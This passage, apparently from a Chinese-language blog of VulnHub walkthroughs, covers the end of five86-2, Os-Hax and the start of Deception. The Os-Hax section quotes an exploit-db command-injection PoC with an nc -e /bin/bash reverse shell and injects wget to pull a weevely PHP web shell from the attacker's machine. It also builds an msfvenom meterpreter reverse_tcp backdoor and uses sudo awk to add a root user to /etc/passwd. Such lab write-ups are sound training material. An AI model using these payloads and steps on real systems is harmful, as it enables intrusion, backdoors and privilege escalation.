secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;passwd</span><br></pre></td></tr></table></figure><p>即可用passwd命令修改root账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root passwd root</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p>切换至root账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>HTTP爆破</p></blockquote><p>我在自己尝试了弱口令字典失败后再想了一下别的方向，无果后去看其他大神的WP，发现需要用rockyou.txt，本地测试跑完这个字典需要数十个小时<br />这一步的话可能换一个简单点的口令或者放一个LFI漏洞去读passwd然后爆破hash就更恰当点</p><blockquote><p>FTP流量劫持</p></blockquote><p>做到流量劫持这一步整个人完全懵了，没想到是怎么看出来后台有FTP传输任务，顺着其他大神的思路打通之后浏览了下那个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat ftp_upload.sh</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">HOST&#x3D;&#39;172.18.0.10&#39;</span><br><span class="line">USER&#x3D;&#39;paul&#39;</span><br><span class="line">PASSWD&#x3D;&#39;esomepasswford&#39;</span><br><span class="line">FILE&#x3D;&#39;file.txt&#39;</span><br><span class="line"></span><br><span class="line">ftp -n $HOST &lt;&lt;END_SCRIPT</span><br><span class="line">quote USER $USER</span><br><span class="line">quote PASS $PASSWD</span><br><span class="line">binary</span><br><span class="line">put $FILE</span><br><span class="line">quit</span><br><span class="line">END_SCRIPT</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p>大意应该是持续用ftp命令上传文件file.txt<br />所以在用命令<code>ps -aux | grep ftp</code>是会看到paul在执行<code>ftp -n 172.18.0.10</code></p><blockquote><p>为什么是网络接口vethf7d5e2c而不是br-eca3858d86bf</p></blockquote><p>本地操作时接口br-eca3858d86bf的ip是172.18.0.1，而vethf7d5e2c没有ipv4地址<br />实际操作时只能尝试监听所有可能的网卡</p><blockquote><p>capabilities 关于linux特权</p></blockquote><p>在系统的角度检测非root用户进行特权操作时，该命令所需的权限与被赋予的权限是否相符<br /><code>getcap -r / 2&gt;/dev/null</code></p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/sparkdev/p/11417781.html">capabilities</a><br /><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities manual page</a><br /><a href="http://www.liuwx.cn/Vulnhub-five86-2.html#tcpdump%E6%8B%A6%E6%88%AA%E7%BD%91%E5%8D%A1%E6%B5%81%E9%87%8F%E8%8E%B7%E5%8F%96FTP%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81">WP</a></p></blockquote><hr /><h1 id="os-hax"><a class="markdownIt-Anchor" href="#os-hax"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hax,389/">Os-Hax</a></h1><p><code>2020/03/17 20:53:03</code></p><h2 id="端口扫描-11"><a class="markdownIt-Anchor" href="#端口扫描-11"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.36</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.36</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)</span><br><span class="line">|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)</span><br><span class="line">|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">MAC Address: 08:00:27:0D:02:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.070 days (since Tue Mar 17 06:51:52 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-11"><a class="markdownIt-Anchor" href="#web路径枚举-11"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.36/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.36&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;css&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;html&#x2F;                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;img&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;index.html (CODE:200|SIZE:3135)                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;js&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;server-status (CODE:403|SIZE:278)                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-11"><a class="markdownIt-Anchor" href="#漏洞利用-11"></a> 漏洞利用</h2><p>枚举wordpress账户的用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; -e u</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] web</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>尝试爆破弱口令，失败</p><p>浏览静态文件时发现图片文件<code>/img/flaghost.png</code><br />图片本身并没有有效信息<br />下载至本地，用LSB隐写检测程序<code>zsteg</code>检测图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg flaghost.png </span><br><span class="line">meta Make           .. text: &quot;passw@45&quot;</span><br></pre></td></tr></table></figure><p>得到字符串<code>passw@45</code></p><p>这里尝试过用这个字符串作为密码来登入wordpress和ssh服务，但都失败<br />尝试后发现路径<code>/passw@45/</code><br />该路径下存在文本<code>flag2.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</span><br><span class="line">&gt;--.- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ ++[-&gt;</span><br><span class="line">+++++ &lt;]&gt;.+ +.+++ +++++ .---- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ ++++[ -&gt;---</span><br><span class="line">----&lt; ]&gt;-.&lt; +++[- &gt;---&lt; ]&gt;--- .+.-- --.++ +.&lt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>brainfuck编码</p><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br />在这个链接解码后得到账户<br /><code>web:Hacker@4514</code><br />这个账户可以用于登入wordpress服务，也可以登入ssh服务</p><hr /><p>这里赘述一下wordpress的渗透思路<br />登入wordpress之后在Plugins面板看到<code>Plainview Activity Monitor</code></p><p>搜索相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Plainview Activity Monitor</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                           |  Path</span><br><span class="line">                                                                                         | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>阅读相关文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line"></span><br><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;wp-admin&#x2F;admin.php?page&#x3D;plainview_activity_monitor&amp;tab&#x3D;activity_tools&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;ip&quot; value&#x3D;&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e &#x2F;bin&#x2F;bash&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;lookup&quot; value&#x3D;&quot;Lookup&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>这里则需要访问<code>/wordpress/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</code></p><p>个人尝试POC所给出的反弹Shell命令时无效，选择先上传php木马再上传meterpreter后门程序的方法</p><p>这里需要注意一点，输入框的相关代码如下<br /><code>&lt;input aria-required=&quot;true&quot; class=&quot;text required validates&quot; id=&quot;plainview_sdk_pvam_form2_inputs_text_ip&quot; maxlength=&quot;15&quot; name=&quot;ip&quot; required=&quot;true&quot; size=&quot;15&quot; type=&quot;text&quot; value=&quot;&quot;&gt;</code><br />maxlength会限制输入的长度，size会限制显示已输入字符的长度，使用F12适当修改即可</p><p>尝试命令注入<br /><code>a.b|ls</code><br />回显得到文件列表</p><p>本地构建php后门并开启HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass shell.php</span><br><span class="line">python -m SinpleHTTPServer 9900</span><br></pre></td></tr></table></figure><p>注入下载命令<br /><code>a.b|wget http://192.168.31.10:9900/shell.php</code></p><p>连接木马<br /><code>weevely http://192.168.31.36/wordpress/wp-admin/shell.php</code></p><p>查看系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造后门程序<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9933 -f elf &gt; msf.elf</code></p><p>MSF开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9933</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>上传后门并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_upload msf.elf &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">.&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure><p>MSF接收到shell<br />之后可能需要靠玩家开脑洞切换到web账户（比如看到passwd文件里存在web账户联想到密码共用）</p><h2 id="权限提升-11"><a class="markdownIt-Anchor" href="#权限提升-11"></a> 权限提升</h2><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh web@192.168.31.36</span><br><span class="line">Hacker@4514</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for web on jax:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User web may run the following commands on jax:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;awk</span><br></pre></td></tr></table></figure><p>可以以root权限执行awk命令<br />可以用awk命令修改文件<code>/etc/passwd</code></p><p>查看文件<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">lxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">user-a:x:1000:1000:uname-a,,,:&#x2F;home&#x2F;uname-a:&#x2F;bin&#x2F;bash</span><br><span class="line">web:x:1001:1000::&#x2F;home&#x2F;web:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>构造账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$qlYFR0rRnblVOfau$jH&#x2F;WAe8jTWMJjZ8&#x2F;eO77&#x2F;JCPHwbSwu1f9LAcv54xbyEfGdTrwaSBhpDIqDRDRb.AnP9QVJg1T9fftOrZH1zsQ1</span><br><span class="line">echo &#39;echo &#39;test:$6$DwMIt8OMOkuT9TVw$Wf4dJhyXDSlGCvseOFVXDc2qzE53zeN.IAPBKVeuFOKIihknB.kmBwqzQnp.RlibevBoJzcDLzSlkDF7OdTIK0:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;1&#39;</span><br></pre></td></tr></table></figure><p>openssl命令需在本地运行</p><p>写入账户信息<br /><code>sudo -u root awk '/web:\/bin\/sh/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></p><p>切换至root</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>localhost</p></blockquote><p>修改文件<code>/etc/hosts</code>，将<code>127.0.0.1 localhost</code>这一行前面加上’#’，再写入<code>IP localhost</code>。这样就解决了点击链接时总是跳转localhost的问题。本地测试时，Chrome访问localhost还是会有问题，而Firefox可以正常访问。</p><blockquote><p>awk</p></blockquote><p>需要通过正则匹配到文件最后的一段字符串，再写入账户信息，否则写入过多数据。</p><blockquote><p>当你收集到的信息越少的时候，需要继续挖掘的地方就越多</p></blockquote><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/jackchen001/p/7111324.html">awk.write</a></p></blockquote><hr /><h1 id="deception"><a class="markdownIt-Anchor" href="#deception"></a> <a href="https://www.vulnhub.com/entry/haclabs-deception,427/">Deception</a></h1><p><code>2020/03/19 19:06:44</code></p><h2 id="端口扫描-12"><a class="markdownIt-Anchor" href="#端口扫描-12"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.207</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.207</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:d0:98:da:0d:32:3d:0b:3f:42:4d:d7:93:4f:fd:60 (RSA)</span><br><span class="line">|   256 4c:f4:2e:24:82:cf:9c:8d:e2:0c:52:4b:2e:a5:12:d9 (ECDSA)</span><br><span class="line">|_  256 a9:fb:e3:f4:ba:d6:1e:72:e7:97:25:82:87:6e:ea:01 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:5B:20:2A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 14.153 days (since Wed Mar  4 23:18:19 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-12"><a class="markdownIt-Anchor" href="#web路径枚举-12"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.207 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.207&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;index.html (CODE:200|SIZE:11026)                                                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;javascript&#x2F;                                                                                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;phpmyadmin&#x2F;                                                                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;server-status (CODE:403|SIZE:279)                                                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: 